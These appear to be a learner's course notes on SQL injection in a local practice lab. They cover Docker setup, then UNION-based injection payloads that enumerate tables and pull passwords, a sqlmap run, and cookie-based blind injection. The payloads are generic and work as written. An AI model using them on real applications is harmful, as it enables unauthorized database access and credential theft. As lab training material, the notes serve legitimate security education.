## Finding and Exploitation of common web vulnerabilities

### ðŸ”µ PEH Docker lab setup and usage instructions:

    apt update
    apt upgrade
    apt install docker.io
    apt install docker-compose
if no running docker daemon then start it (assuming we have docker io / docker compose installed)

check status:  

    systemctl status docker  
start docker:  

    systemctl start docker (if required)
    docker-compose up
stop container:  

    ctrl c  
have docker run in the background use -d for detached mode:  
    
    docker-compose -d
to check what dockers are running:  
    
    docker ps -a  
to stop:

    docker-compose stop
to remove a container, look for container ID and remove:

    docker rm 02dfB1w20cdcd11ee
to remove all containers:

    docker -rm $(sudo docker ps -aq)

to reset the instance from browser when docker instances are live:

    localhost/init.php

#### Once PEH docker is installed, with ./permission.sh file set, run localhost from burpe browser.

---

### ðŸ”´ SQL Injection - Introduction Injection 0x01:

#### Lab 0x01 UNION 

User search: jeremy presents username and email fields  
![image](https://github.com/user-attachments/assets/ff8b811f-0322-46f2-80f7-2bb05f3518b3)

When probing a new site, firstly understand what the function is providing. Begin by probing with common inputs ', ' ', example', " ", "example"  

Then move on to using **logical operators**  
jeremy' or 1=1#  
jeremy' or 1=1-- -  

if successful move to using **union select** and figuring out the amount of null values required to return a response  
jeremy' union select null#  
jeremy' union select null,null,null#  

the third null respondes with results, indicating it has selected three coloumns in the background, loaded more information but only presenting two for us to see.  
![image](https://github.com/user-attachments/assets/45806752-eb2c-4640-81ed-0ad1e6a8389b)

jeremy' union select null,null,version()#  
![image](https://github.com/user-attachments/assets/8f0e98a3-6470-461a-a92d-295c4392b99a)

**Expanding this to look at the table names from the database**  
jeremy' union select null,null,table_name from information_schema.tables#  

**Expand this to look at the collumn names from the database**  
jeremy' union select null,null,column_name from information_schema.columns#

**Now to look for Jeremys or other password from this database, we need to identify the table (injection0x01) his details belongs to using the tables query**  

jeremy' union select null,null,password from injection0x01#
![image](https://github.com/user-attachments/assets/2a90862c-613b-4c97-a679-ffd62e8710e4)

**Note for intergers, in siutations such as user has an ID - Rare, may need to look into this more**  
jeremy' union select null(int),null,null from injection0x01#  

for example we may require the usage below to work with some queries  
jeremy' union select username,1,passwords from injection0x01#  

**Cheat Sheet PortSwigger website for different SQL injection databases**  
<https://portswigger.net/web-security/sql-injection/cheat-sheet>  

---

### ðŸ”´ SQL Injection - Blind Part 1 Injection 0x02:  

#### Lab 0x02 BLIND  
Testing the behaviour of the application.  

* Target: adding the target url to reduce noise  
* Proxy/HTTP history: to view request and response  
* Repeater: send captured Request or Response traffic to view and manipulate. Items to look out for: Cookies, Content Length  

![image](https://github.com/user-attachments/assets/ce2c8585-3af9-41a2-aa8d-038d95f1e5ae)

#### Probe  
Here we attempt basic SQL changes in the POST:request data by probing the username section with url encoded jeremy' or 1=1# and testing it with other common formats, whilst also checking if the response content-length changes to a succesful one.  

#### SQLMAP (to help look for wins)  
After multiple failed attempts, we can move to a tool called sqlmap. From the clean Repeater:Request window with the working credentials. Copy and paste into a .txt file.  

![image](https://github.com/user-attachments/assets/d6f2b0f6-222b-476e-8e37-1886b81bcf91)  

    sqlmap -r sqltraining.txt

![image](https://github.com/user-attachments/assets/11632c30-c902-4740-9560-999972de3349)  

it looks like nothing from this captured POST request can be exploited based from these checks.

#### Check for other injections points  
After the POST:request is sent, we notice there is a GET:request containing cookies. This means it also has to be processed as well by the application. Taking note of the 'content length' of a successful Request, we can begin checking basic SQL injection queries with the cookie.  

![image](https://github.com/user-attachments/assets/88ab0d83-9b46-4846-ad32-86f7662fead8)

Here we have sucessfully manupilated the cookie section by injecting SQL into it, indicating this area is vulnerable.

### ðŸ”´ SQL Injection - Blind Part 2 Injection 0x02: 

#### Lab 0x02 BLIND  
We have now identified a Blind SQL injection, because the query is only changing the behaviour of the application. I.E the content-length or 'welcome' message when query is true. And through this we are able to exploit this behaviour to slowly extract data via True or False queries.  
